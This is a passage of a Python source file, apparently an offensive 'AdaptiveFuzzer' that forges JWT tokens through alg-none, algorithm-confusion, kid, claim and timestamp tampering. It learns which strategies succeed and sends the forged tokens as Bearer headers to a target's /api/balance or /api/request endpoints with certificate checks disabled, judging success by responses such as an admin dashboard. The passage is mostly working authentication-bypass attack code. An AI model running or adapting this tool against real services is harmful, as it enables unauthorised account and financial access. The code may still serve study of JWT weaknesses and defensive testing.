        if 'mutation_success_rates' not in self.learning_data:
            self.learning_data['mutation_success_rates'] = {}
        
        if strategy in self.learning_data['mutation_success_rates']:
            current_rate = self.learning_data['mutation_success_rates'][strategy]['success_rate']
            learning_rate = self.config.get('learning_rate', 0.1)
            
            # Increase the success rate
            new_rate = current_rate + learning_rate * (1 - current_rate)
            self.learning_data['mutation_success_rates'][strategy]['success_rate'] = new_rate
            self.learning_data['mutation_success_rates'][strategy]['attempts'] += 1
            self.learning_data['mutation_success_rates'][strategy]['successes'] += 1 if analysis.get('success', False) else 0
        else:
            # Initialize with default success rate
            default_rate = self.mutation_strategies.get(strategy, {}).get('success_rate', 0.5)
            self.learning_data['mutation_success_rates'][strategy] = {
                'attempts': 1,
                'successes': 1 if analysis.get('success', False) else 0,
                'success_rate': default_rate
            }
        
        # Store successful mutation
        if 'successful_mutations' not in self.learning_data:
            self.learning_data['successful_mutations'] = {}
        
        if strategy not in self.learning_data['successful_mutations']:
            self.learning_data['successful_mutations'][strategy] = []
        
        # Add to successful mutations
        self.learning_data['successful_mutations'][strategy].append({
            'mutation_type': mutation_type,
            'timestamp': datetime.now().isoformat(),
            'confidence': analysis.get('confidence', 0.0)
        })
        
        # Save updated learning data
        self._save_learning_data()
    
    def prioritize_strategies(self, target_info: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        """
        Prioritize mutation strategies based on learning data and target info.
        
        Args:
            target_info: Optional information about the target
            
        Returns:
            List of strategies with priority information
        """
        prioritized_strategies = []
        
        # Start with all strategies
        for strategy, info in self.mutation_strategies.items():
            # Get success rate from learning data or use default
            success_rate = self.learning_data['mutation_success_rates'][strategy]['success_rate']
            
            # Calculate priority score
            priority_score = info.get('priority', 5) * success_rate
            
            # Adjust based on target info if available
            if target_info:
                # Boost algorithms attacks if target uses JWT
                if strategy in ['alg_none', 'alg_manipulation'] and target_info.get('uses_jwt', False):
                    priority_score *= 1.2
                
                # Boost kid attacks if target might have kid parameter
                if strategy == 'kid_manipulation' and target_info.get('jwt_uses_kid', False):
                    priority_score *= 1.3
                
                # Boost timestamp manipulation if tokens might expire
                if strategy == 'timestamp_manipulation' and target_info.get('jwt_has_expiration', False):
                    priority_score *= 1.2
            
            prioritized_strategies.append({
                'strategy': strategy,
                'description': info.get('description', ''),
                'success_rate': success_rate,
                'priority_score': priority_score,
                'base_priority': info.get('priority', 5)
            })
        
        # Sort by priority score (descending)
        prioritized_strategies.sort(key=lambda s: s['priority_score'], reverse=True)
        
        return prioritized_strategies
    
    def generate_adaptive_mutations(self, token: str, target_info: Optional[Dict[str, Any]] = None, 
                                 limit: int = 20) -> List[Dict[str, Any]]:
        """
        Generate adaptive mutations based on learning data and target info.
        
        Args:
            token: The JWT token to mutate
            target_info: Optional information about the target
            limit: Maximum number of mutations to generate
            
        Returns:
            List of mutation information dictionaries
        """
        # Prioritize strategies
        strategies = self.prioritize_strategies(target_info)
        
        # Generate mutations for each strategy, weighted by priority
        all_mutations = []
        strategy_quota = {}
        
        # Calculate mutation quota for each strategy based on priority
        total_priority = sum(s['priority_score'] for s in strategies)
        remaining_limit = limit
        
        if total_priority > 0:
            for strategy in strategies:
                strat_name = strategy['strategy']
                quota = max(1, int((strategy['priority_score'] / total_priority) * limit))
                strategy_quota[strat_name] = min(quota, remaining_limit)
                remaining_limit -= strategy_quota[strat_name]
        else:
            # Equal distribution if no priority information
            equal_quota = max(1, limit // len(strategies))
            for strategy in strategies:
                strategy_quota[strategy['strategy']] = equal_quota
        
        # Generate mutations for each strategy up to its quota
        for strategy in strategies:
            strat_name = strategy['strategy']
            strat_mutations = self.generate_mutations(token, strat_name, strategy_quota[strat_name])
            all_mutations.extend(strat_mutations)
        
        # Ensure we don't exceed the limit
        if len(all_mutations) > limit:
            all_mutations = all_mutations[:limit]
        
        return all_mutations
    
    def get_successful_mutations(self) -> Dict[str, List[Dict[str, Any]]]:
        """
        Get successful mutations from the history.
        
        Returns:
            Dictionary mapping strategies to lists of successful mutations
        """
        return self.successful_mutations
    
    def get_learning_statistics(self) -> Dict[str, Any]:
        """
        Get statistics about the learning process.
        
        Returns:
            Dictionary with learning statistics
        """
        stats = {
            'total_attempts': len(self.token_history),
            'successful_attempts': sum(1 for entry in self.token_history if entry.get('success', False)),
            'strategy_success_rates': self.learning_data['mutation_success_rates'],
            'most_successful_strategy': None,
            'most_successful_mutation_type': None
        }
        
        # Find most successful strategy
        if stats['strategy_success_rates']:
            stats['most_successful_strategy'] = max(
                stats['strategy_success_rates'].items(), 
                key=lambda x: x[1]['success_rate']
            )[0]
        
        # Count mutation types
        mutation_counts = {}
        for entry in self.token_history:
            if entry.get('success', False):
                mutation_type = entry.get('mutation_type', 'unknown')
                mutation_counts[mutation_type] = mutation_counts.get(mutation_type, 0) + 1
        
        # Find most successful mutation type
        if mutation_counts:
            stats['most_successful_mutation_type'] = max(
                mutation_counts.items(), 
                key=lambda x: x[1]
            )[0]
            
            stats['mutation_type_counts'] = mutation_counts
        
        return stats

    def send_attack_request(self, target_url: str, mutation_info: Dict[str, Any], strategy: Dict[str, Any]) -> Dict[str, Any]:
        """
        Envia uma requisição de ataque com o token mutado.
        """
        result = {
            'success': False,
            'error': None,
            'response': None,
            'analysis': None
        }
        
        try:
            # Prepare headers with the mutated token
            headers = {
                'Authorization': f"Bearer {mutation_info.get('token', '')}",
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            
            # Add any additional headers from mutation if applicable
            if 'headers' in mutation_info:
                headers.update(mutation_info['headers'])
            
            # Determine the endpoint to target
            endpoint = '/api/balance' if 'balance' in strategy.get('target', '').lower() else '/api/request'
            
            # Configurar conexão
            conn = ConnectionManager(
                base_url=target_url,
                timeout=10,
                verify_ssl=False
            )
            conn.session.headers.update(headers)
            
            # Send the request
            response = conn.get(endpoint)
            
            if isinstance(response, dict) and "error" in response:
                result['error'] = response['error']
                logger.error(f"Erro ao enviar requisição de ataque para {target_url}: {response['error']}")
                return result
            
            # Store response details
            result['response'] = {
                'status_code': response.status_code,
                'body': response.text[:1000],  # Limit body size for logging
                'headers': dict(response.headers)
            }
            
            # Analyze the response for success indicators
            analysis = self.analyze_response(result['response'], mutation_info)
            result['analysis'] = analysis
            
            # Update learning data based on response
            self._add_to_history(mutation_info, result['response'], analysis)
            self._update_learning_data(mutation_info, analysis)
            
            logger.info(f"Requisição de ataque para {target_url} concluída com status {response.status_code}")
            result['success'] = True
            return result
            
        except Exception as e:
            logger.error(f"Erro ao enviar requisição de ataque para {target_url}: {str(e)}")
            result['error'] = str(e)
            return result

    def generate_mutations_for_strategy(self, strategy: Dict[str, Any], limit: int = 10) -> List[Dict[str, Any]]:
        """
        Generate mutations based on a specific attack strategy.
        
        Args:
            strategy: Dictionary containing strategy details
            limit: Maximum number of mutations to generate
        
        Returns:
            List of mutation dictionaries
        """
        logger.info(f"Generating mutations for strategy: {strategy.get('strategy', 'unknown')}")
        mutations = []
        
        try:
            # Placeholder for token - in a real scenario, this would use a base token
            token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
            decoded = self.decode_token(token)
            
            strategy_name = strategy.get('strategy', '')
            if strategy_name in self.mutation_strategies:
                if strategy_name == 'alg_none':
                    mutations.extend(self._mutate_alg_none(decoded))
                elif strategy_name == 'alg_manipulation':
                    mutations.extend(self._mutate_alg_manipulation(decoded))
                elif strategy_name == 'signature_bypass':
                    mutations.extend(self._mutate_signature_bypass(decoded))
                elif strategy_name == 'header_injection':
                    mutations.extend(self._mutate_header_injection(decoded))
                elif strategy_name == 'payload_injection':
                    mutations.extend(self._mutate_payload_injection(decoded))
                elif strategy_name == 'kid_manipulation':
                    mutations.extend(self._mutate_kid_manipulation(decoded))
                elif strategy_name == 'claim_deletion':
                    mutations.extend(self._mutate_claim_deletion(decoded))
                elif strategy_name == 'claim_addition':
                    mutations.extend(self._mutate_claim_addition(decoded))
                elif strategy_name == 'timestamp_manipulation':
                    mutations.extend(self._mutate_timestamp_manipulation(decoded))
            
            return mutations[:limit]
        except Exception as e:
            logger.error(f"Error generating mutations for strategy {strategy.get('strategy', 'unknown')}: {str(e)}")
            return mutations

    def generate_targeted_mutations(self, vulnerability: Dict[str, Any], limit: int = 20) -> List[Dict[str, Any]]:
        """
        Generate mutations targeted at a specific vulnerability.
        
        Args:
            vulnerability: Dictionary containing vulnerability details
            limit: Maximum number of mutations to generate
        
        Returns:
            List of mutation dictionaries
        """
        logger.info(f"Generating targeted mutations for vulnerability: {vulnerability.get('type', 'unknown')}")
        mutations = []
        
        try:
            # Placeholder for token - in a real scenario, this would use a base token
            token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
            decoded = self.decode_token(token)
            
            vuln_type = vulnerability.get('type', '')
            if 'jwt_none_algorithm' in vuln_type:
                mutations.extend(self._mutate_alg_none(decoded))
            elif 'jwt_weak_algorithm' in vuln_type:
                mutations.extend(self._mutate_alg_manipulation(decoded))
            elif 'jwt_kid_parameter' in vuln_type:
                mutations.extend(self._mutate_kid_manipulation(decoded))
            elif 'header_injection' in vuln_type:
                mutations.extend(self._mutate_header_injection(decoded))
            elif 'information_disclosure' in vuln_type or 'sql_injection' in vuln_type:
                mutations.extend(self._mutate_payload_injection(decoded))
            
            return mutations[:limit]
        except Exception as e:
            logger.error(f"Error generating targeted mutations for {vulnerability.get('type', 'unknown')}: {str(e)}")
            return mutations

    def generate_mutations_with_learning(self, previous_results: List[Dict[str, Any]], limit: int = 10) -> List[Dict[str, Any]]:
        """
        Generate mutations based on learning from previous attack results.
        
        Args:
            previous_results: List of previous attack attempt results
            limit: Maximum number of mutations to generate
        
        Returns:
            List of mutation dictionaries
        """
        logger.info(f"Generating mutations with learning from {len(previous_results)} previous results")
        mutations = []
        
        try:
            # Placeholder for token - in a real scenario, this would use a base token
            token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
            decoded = self.decode_token(token)
            
            # Analyze previous results to prioritize strategies
            successful_strategies = [r.get('strategy', '') for r in previous_results if r.get('analysis', {}).get('success_likelihood', 0) > 0.5]
            strategy_counts = Counter(successful_strategies)
            prioritized_strategy = strategy_counts.most_common(1)[0][0] if strategy_counts else list(self.mutation_strategies.keys())[0]
            
            if prioritized_strategy == 'alg_none':
                mutations.extend(self._mutate_alg_none(decoded))
            elif prioritized_strategy == 'alg_manipulation':
                mutations.extend(self._mutate_alg_manipulation(decoded))
            elif prioritized_strategy == 'signature_bypass':
                mutations.extend(self._mutate_signature_bypass(decoded))
            elif prioritized_strategy == 'header_injection':
                mutations.extend(self._mutate_header_injection(decoded))
            elif prioritized_strategy == 'payload_injection':
                mutations.extend(self._mutate_payload_injection(decoded))
            elif prioritized_strategy == 'kid_manipulation':
                mutations.extend(self._mutate_kid_manipulation(decoded))
            elif prioritized_strategy == 'claim_deletion':
                mutations.extend(self._mutate_claim_deletion(decoded))
            elif prioritized_strategy == 'claim_addition':
                mutations.extend(self._mutate_claim_addition(decoded))
            elif prioritized_strategy == 'timestamp_manipulation':
                mutations.extend(self._mutate_timestamp_manipulation(decoded))
            
            return mutations[:limit]
        except Exception as e:
            logger.error(f"Error generating mutations with learning: {str(e)}")
            return mutations


if __name__ == "__main__":
    # Example usage
    fuzzer = AdaptiveFuzzer()
    
    # Example token
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyNDI2MjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    # Generate mutations
    mutations = fuzzer.generate_mutations(token, limit=5)
    print(f"Generated {len(mutations)} mutations")
    
    for i, mutation in enumerate(mutations, 1):
        print(f"\nMutation {i}:")
        print(f"Strategy: {mutation.get('strategy')}")
        print(f"Type: {mutation.get('mutation_type')}")
        print(f"Token: {mutation.get('token')}")
        
        # Simulate a response for this mutation
        simulated_response = {
            'status_code': 200 if i == 1 else 401,  # Simulate success for first mutation
            'body': 'Welcome to admin dashboard' if i == 1 else 'Invalid token'
        }
        
        # Analyze the response
        analysis = fuzzer.analyze_response(simulated_response, mutation)
        print(f"Success: {analysis.get('success')}")
        print(f"Confidence: {analysis.get('confidence'):.2f}")
    
    # Get learning statistics
    stats = fuzzer.get_learning_statistics()
    print("\nLearning Statistics:")
    print(f"Total attempts: {stats['total_attempts']}")
    print(f"Successful attempts: {stats['successful_attempts']}")
    if stats['most_successful_strategy']:
        print(f"Most successful strategy: {stats['most_successful_strategy']}")
    
    # Generate adaptive mutations
    target_info = {
        'uses_jwt': True,
        'jwt_uses_kid': True,
        'jwt_has_expiration': True
    }
    
    adaptive_mutations = fuzzer.generate_adaptive_mutations(token, target_info, limit=10)
    print(f"\nGenerated {len(adaptive_mutations)} adaptive mutations")
    for i, mutation in enumerate(adaptive_mutations, 1):
        print(f"{i}. {mutation.get('mutation_type')} ({mutation.get('strategy')})") 